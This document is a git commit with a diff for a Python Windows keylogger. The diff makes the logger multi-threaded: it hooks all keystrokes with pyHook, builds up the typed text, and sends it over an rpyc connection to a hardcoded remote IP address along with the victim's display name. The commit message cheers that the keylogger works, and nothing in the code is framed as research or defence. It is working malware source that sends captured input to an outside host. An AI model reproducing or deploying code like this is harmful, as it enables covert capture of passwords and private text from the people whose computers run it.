8f92c0b220f1e4f4447d9ae13de048c28245100c
kevin.postal <kevindpostal@gmail.com>
2010-10-12 17:44:55 -0700

    HOLY SHIT - MULTI THREADED KEYLOGGER IS WORKINGgit statusgit status! WOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO

--- client.py
+++ client.py
@@ -6,14 +6,16 @@ from includes.wininfo import *
 def main():
     
     conn = connect("67.23.25.86")
+    conn.modules.sys.stdout.write("\n=====NEW USER CONNECTED!=====\n\n")
     windows = WinInfo()
     username = "\nUserName: %s\n" % (windows.get_display_name())
     
     logger = Keylog(conn)
+    logger.setDaemon(False)
+    logger.start()
 
     conn.modules.sys.stdout.write(username)
-
-
+  
 def connect(server):
     return rpyc.classic.connect(server)
     
--- includes/keylog.py
+++ includes/keylog.py
@@ -1,8 +1,11 @@
 import ctypes
 import time
+import threading
+import pythoncom, pyHook
 
-class Keylog():
+class Keylog(threading.Thread):
   def OnKeyboardEvent(self,event):
+    self.e.set()
     print 'MessageName:',event.MessageName
     print 'Message:',event.Message
     print 'Time:',event.Time
@@ -16,37 +19,45 @@ class Keylog():
     print 'Injected:', event.Injected
     print 'Transition', event.Transition
     print '---'
+
+    self.message += chr(event.Ascii).__str__()
     
-    #import pdb; pdb.set_trace()
-    message = chr(event.Ascii).__str__()
-
-    self.output(message)
-
+    #if not self.e.wait():
+    #  print "unset"
+    #  self.e.clear()
+    
+    #self.conn.modules.sys.stdout.write("test")
     #ctypes.windll.user32.PostQuitMessage(0)
+    #self.output(message)
     
     if int(event.Ascii) == 3:
       print 'Time to quit this bitch'
       ctypes.windll.user32.PostQuitMessage(0)
       return False
-      
+    
+    t1 = threading.Thread(name='keylog_output_thread', target=self.output, args=(self.message + "\n",) )
+    t1.start()
+    
     return True
     
   def output(self,message):
-
     self.conn.modules.sys.stdout.write(message)
     
-
-    
   def __init__(self,conn):
-    
-    import pythoncom, pyHook
+    threading.Thread.__init__(self)
     self.conn = conn
+    #self.message = "Keyload Thread Started\n"
+    return 
+  
+  def run(self):
     hm = pyHook.HookManager()
     hm.KeyDown = self.OnKeyboardEvent
     hm.HookKeyboard()
-    conn.modules.sys.stdout.write("Key Logger Started\n")
+    self.conn.modules.sys.stdout.write("Key Logger Started\n")
     
+    self.e = threading.Event()
 
-    #pythoncom.PumpMessages()
-    
-    return 
+    pythoncom.PumpMessages() 
+  
+
+  
